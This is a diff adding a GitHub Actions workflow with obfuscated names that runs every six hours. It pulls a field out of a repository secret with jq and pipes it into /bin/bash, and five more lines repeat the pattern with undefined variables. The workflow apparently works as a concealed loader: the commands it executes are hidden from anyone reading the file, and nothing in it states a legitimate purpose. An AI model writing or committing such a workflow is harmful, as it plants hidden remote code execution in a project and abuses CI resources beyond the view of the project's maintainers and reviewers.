@@ -1,0 +1,23 @@
+name: literatureokay
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '28 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: literatureokay
+        env:
+          nwp81: ${{ secrets.nwp81 }}
+        run: |
+          echo $nwp81 | jq -r .h09298 | /bin/bash
+          echo $iffcl17 | jq -r .c86771 | /bin/bash
+          echo $zndtl2 | jq -r .f22 | /bin/bash
+          echo $nvrx90372 | jq -r .huf51486 | /bin/bash
+          echo $furhh62 | jq -r .rcdj95622 | /bin/bash
+          echo $mwgxz2967 | jq -r .evws5 | /bin/bash
+
